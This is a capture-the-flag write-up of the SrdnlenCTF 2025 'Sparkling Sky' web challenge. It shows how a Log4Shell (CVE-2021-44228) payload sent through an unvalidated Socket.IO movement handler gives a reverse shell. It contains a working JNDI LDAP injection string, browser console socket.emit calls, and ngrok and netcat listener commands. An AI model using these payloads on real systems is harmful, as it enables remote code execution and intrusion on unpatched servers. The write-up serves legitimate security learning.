
# 🌐 Sparkling Sky


![Challenge Presentation](/images/SrdnlenCTF-2025/SparklingSky/challenge_presentation.png "Challenge Presentation")

## 📊 Challenge Overview
>
>| Category | Details | Additional Info |
>|----------|---------|-----------------|
>| 🏆 Event | SrdnlenCTF - 2025 | [Event Link](https://ctf.srdnlen.it/challenges#challenge-24) |
>| 🔰 Category | Web | 🌐 |
>| 💎 Points | 500 | Out of XXXX total |
>| ⭐ Difficulty | 🟡 Medium | Personal Rating: 5/10 |
>| 👤 Author | sanmatte | [Profile]() |
>| 🎮 Solves (At the time of flag submission) | 49 | XX% solve rate |
>| 📅 Date | 19-01-2025 | SrdnlenCTF - 2025 Day X |
>| 🦾 Solved By | devgianlu | Team: Team Aetruria |

## 📝 Challenge Information
>I am developing a game with websockets in python. I left my pc to a java fan, I think he really messed up.  It is forbidden to perform or attempt to perform any action against the infrastructure or the challenge itself.  
>- username: user1337 
>- password: user1337 
>
>website: http://sparklingsky.challs.srdnlen.it:8081

## 🎯 Challenge Files & Infrastructure

### Provided Files
>Files:
>- [:(far fa-file-archive fa-fw): Attached Files](https://drive.google.com/file/d/1cyxG-664HNH09s_-QHxbwPqf7kNqJ2t4/view?usp=drive_link)

# 🔍 Initial Analysis

## First Steps
> Initially, the website appears as follows:
> 
> ![Site Presentation](/images/SrdnlenCTF-2025/SparklingSky/site_presentation.png "Site Presentation")
>
> By entering the login credentials specified in the challenge description, we are redirected to this page:
> 
> ![Play](/images/SrdnlenCTF-2025/SparklingSky/play.png "Play")
> 
> From here, every time I clicked on play, nothing happened; only the access number in the queue changed. For this reason, I decided to read the attached files, and the first thing that caught my eye was the `log4j.properties` file. From there, I realized it was using Log4j, so I went to check the installed version in the `Dockerfile`:
> 
> ```Dockerfile
> RUN cd $(python -c "import os, pyspark; print(os.path.dirname(pyspark.__file__))")/jars && \
>    rm log4j* && \
>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar && \
>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar && \
>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-slf4j-impl/2.14.1/log4j-slf4j-impl-2.14.1.jar && \
>    wget https://repo1.maven.org/maven2/org/apache/logging/log4j/log4j-1.2-api/2.14.1/log4j-1.2-api-2.14.1.jar
> ```
> 
> As we can see, the version is `2.14.1`. Searching online, this version is vulnerable to `CVE-2021-44228`. Now we just need to figure out how to send the payload to exploit it. Continuing to read, I noticed in the `anticheat.py` file the use of `spark` and `log4j`, so I understood that the game's anticheat system needed to be triggered in some way to exploit the vulnerability:
> 
> ```python
> log4j_config_path = "log4j.properties"
>
>spark = SparkSession.builder \
>    .appName("Anticheat") \
>    .config("spark.driver.extraJavaOptions",
>            "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:" + log4j_config_path) \
>    .config("spark.executor.extraJavaOptions",
>            "-Dcom.sun.jndi.ldap.object.trustURLCodebase=true -Dlog4j.configuration=file:" + log4j_config_path) \
>    .getOrCreate()
>
>logger = spark._jvm.org.apache.log4j.LogManager.getLogger("Anticheat")
> ```
> 
> Continuing to read the files, I noticed that the browser and server also communicate via Socket.IO. However, if we examine the `socket.py` file, we see that there is no input validation. Even though our account is just a spectator, we can call any function. The `handle_bird_movement` function, although it uses the user ID, does not take it from cookies. It retrieves it from user-controlled input, so we can provide any ID we want, whether it belongs to a player or a spectator:
> 
> ```python
> def init_socket_events(socketio, players):
>
>    @socketio.on('connect')
>    @login_required
>    def handle_connect():
>        user_id = int(current_user.get_id())
>        log_action(user_id, "is connecting")
>        if user_id in players.keys():
>            # Player already exists, send their current position
>            emit('connected', {'user_id': user_id, 'x': players[user_id]['x'], 'y': players[user_id]['y'], 'angle': players[user_id]['angle']})
>        else:
>            # TODO: Check if the lobby is full and add the player to the queue
>            log_action(user_id, f"is spectating")
>        emit('update_bird_positions', players, broadcast=True)
>
>    @socketio.on('move_bird')
>    @login_required
>    def handle_bird_movement(data):
>        user_id = data.get('user_id')
>        if user_id in players:
>            del data['user_id']
>            if players[user_id] != data:
>                with lock:
>                    players[user_id] = {
>                        'x': data['x'],
>                        'y': data['y'],
>                        'color': 'black',
>                        'angle': data.get('angle', 0)
>                    }
>                    if analyze_movement(user_id, data['x'], data['y'], data.get('angle', 0)):
>                        log_action(user_id, f"was cheating with final position ({data['x']}, {data['y']}) and final angle: {data['angle']}")
>                        # del players[user_id] # Remove the player from the game - we are in beta so idc
>                    emit('update_bird_positions', players, broadcast=True)
>
>    @socketio.on('disconnect')
>    @login_required
>    def handle_disconnect(data):
>        user_id = current_user.get_id()
>        if user_id in players:
>            del players[user_id]
>        emit('update_bird_positions', players, broadcast=True)
>```
>
> To trigger the anticheat, we still need to bypass the `analyze_movement` function. This function calculates whether our speed exceeds a certain threshold (the speed is calculated using other data like coordinates and timestamps). If it detects suspicious movement, it will log the attempt (inserting our payload into the logs). It also interpolates the `angle` property, which is never used in `analyze_movement`, so we can set it to whatever we want. Let’s proceed with the exploit.

## 🔬 Vulnerability Analysis
### Potential Vulnerabilities
>- [x] Log4Shell

# 🎯 Solution Path

## Exploitation Steps
### Initial setup
> The exploit essentially relies on sending a string like `jndi:ldap://<ip>:1389/a` to the server to have it written in the Log4j logs. Once this is done, we will receive a connection on our previously started server, obtaining a reverse shell.
>
### Exploitation
> First, I set up the port forwarding, as the `poc.py` file that exploits the vulnerability requires 3 port forwardings:
> 
>   ```bash
> ngrok tcp 1389
> ngrok http 8080
> ngrok tcp 9001  
>   ```
>
> The first port is where the `LDAP` server will be hosted, the second is for the `web server` where the string we send will retrieve the `java` exploit created by the `poc.py` file, and finally, the last port is used to receive the `reverse shell` on `netcat`. So, we also open a `netcat` session:
>
>```bash
>   nc -lvnp 9001
>```
>
> And then, I start the exploit:
> 
> ```bash
>   python poc.py --userip  ngrok_link --webport 8080 --lport 9001
>```
>
> Once that is done, all that’s left is to send the string to the server to insert it into the logs. This can be done by writing a Python script with a socket connection to the server:
> 
>```bash
>   python exploit.py
>```
>
> Of course, in the exploit, every time it is run, the new `ldap` forwarding link created with `ngrok` must be set. This allowed me to obtain a reverse shell, and by running `cat flag.txt`, I was able to retrieve the flag.

# 🛠️ Exploitation Process
## Approach
> I used the following [exploit](https://github.com/kozmer/log4j-shell-poc/). I installed `openjdk-11-jdk` (which is also used in the challenge), then in `poc.py` I replaced all the relative paths to the JDK with the names of the binaries, which are now in the `PATH`. I ran `python3 poc.py --userip <ip> --webport 8080 --lport 9001`, which starts the LDAP server on port 1389 and the HTTP server on port 8080. Then, in another terminal, I started a netcat listener on port 9001 (`nc -lvnp 9001`). I performed the port forwarding for the 3 ports and ran `exploit.py`. Another way to do this was directly via the DevTools, as we have direct access to the `socket` variable in DevTools. We can interact directly with the socket. To activate the anticheat, we can send two movements with a short interval, using very different coordinates:
>
>```js
> socket.emit("move_bird", {"user_id": 1, "x": 0, "y": 0, "angle": "${jndi:ldap://<ip\>:1389/a}"});
> setTimeout(() => {
>    socket.emit("move_bird", {"user_id": 1, "x": 142142352425524, "y": 4322525524, "angle": "${jndi:ldap://<ip\>:1389/a}"})
>}, 2000);
>```
>
> - [:(far fa-file-archive fa-fw): Exploit](/resources/SrdnlenCTF-2025/SparklingSky/exploit.py)
> - [:(far fa-file-archive fa-fw): POC](https://github.com/kozmer/log4j-shell-poc)

# 🚩 Flag Capture
>{{< admonition danger "Flag" >}}
{{< typeit tag=h4 >}}
srdnlen{I_th1nk_h3_r34lly_m3ss3d_up}
{{< /typeit >}}
>{{< /admonition >}}
>
# 🔧 Tools Used
>| Tool | Purpose |
>|------|---------|
>| Python | Exploit |
>| Ngrok | Port Forwarding |

# 📈 Technical Deep Dive
## Vulnerability Details
>- Type: RCE (CVE-2021-44228)
>- CVSS Score: 10
## Mitigation Strategies
> Update to the last version of log4j.

# 💡 Key Learnings
## New Knowledge
> I learned how to exploit the Log4j vulnerability through the PoC.
> 
## Skills Improved
>- [ ] Binary Exploitation
>- [ ] Reverse Engineering
>- [x] Web Exploitation
>- [ ] Cryptography
>- [ ] Forensics
>- [ ] OSINT
>- [ ] Miscellaneous

# 📚 References & Resources
## Official Documentation
>- [Tool Docs](https://github.com/kozmer/log4j-shell-poc/tree/main)
>- [Vulnerability Info](https://nvd.nist.gov/vuln/detail/cve-2021-44228)
>
## Learning Resources
>- https://sysdig.com/blog/exploit-detect-mitigate-log4j-cve/
>- https://systemoverlord.com/2022/06/20/bsidessf-2022-ctf-login4shell.html
>- https://snyk.io/blog/fetch-the-flag-ctf-2022-writeup-logster/
>- https://www.youtube.com/watch?v=P8uOcQIE4Uk&ab_channel=2bitSec
>- https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/

---
# 📊 Final Statistics

| Metric | Value | Notes |
|--------|--------|-------|
| Time to Solve | 00:44 | From start to flag |
| Global Ranking (At the time of flag submission) | 26/1577 | Challenge ranking |
| Points Earned | 500 | Team contribution |

*Created: 19-01-2025 • Last Modified: 19-01-2025*
*Author: mH4ck3r0n3 • Team: Team Aetruria*
